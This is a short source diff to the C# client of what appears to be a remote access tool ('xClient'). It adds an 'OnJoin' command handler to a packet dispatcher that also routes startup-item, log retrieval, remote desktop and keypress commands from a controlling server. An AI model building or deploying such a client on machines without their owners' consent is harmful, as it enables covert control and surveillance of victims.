@@ -86,6 +86,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
+                typeof (Core.Packets.ServerPackets.OnJoin),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -236,7 +237,7 @@ namespace xClient
         private static void ClientRead(Client client, IPacket packet)
         {
             var type = packet.GetType();
-
+            //MessageBox.Show(type.FullName);
             if (type == typeof (Core.Packets.ServerPackets.InitializeCommand))
             {
                 CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand) packet, client);
@@ -262,6 +263,7 @@ namespace xClient
             {
                 CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall) packet, client);
             }
+            
             else if (type == typeof (Core.Packets.ServerPackets.Desktop))
             {
                 CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop) packet, client);
@@ -301,6 +303,10 @@ namespace xClient
             else if (type == typeof(Core.Packets.ServerPackets.KeyPress))
             {
                 CommandHandler.HandleKeyPress((Core.Packets.ServerPackets.KeyPress)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.OnJoin))
+            {
+                CommandHandler.HandleOnJoin((Core.Packets.ServerPackets.OnJoin)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetSystemInfo))
             {
